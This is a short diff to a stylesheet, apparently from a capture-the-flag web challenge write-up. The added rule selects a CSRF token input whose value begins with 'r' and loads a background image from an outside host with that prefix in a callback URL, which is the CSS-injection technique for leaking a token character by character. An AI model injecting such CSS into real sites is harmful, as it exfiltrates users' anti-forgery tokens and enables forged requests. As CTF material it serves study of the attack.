@@ -1,3 +1,1 @@
-input[value^="r"] {
-    background-image: url("https://writeups-challenges-ctfs.onrender.com/web-client/ch62/r");
-}
+input[name=csrf][value^="r"] { background: url(https://writeups-challenges-ctfs.onrender.com/web-client/ch62/callback?token=r); }
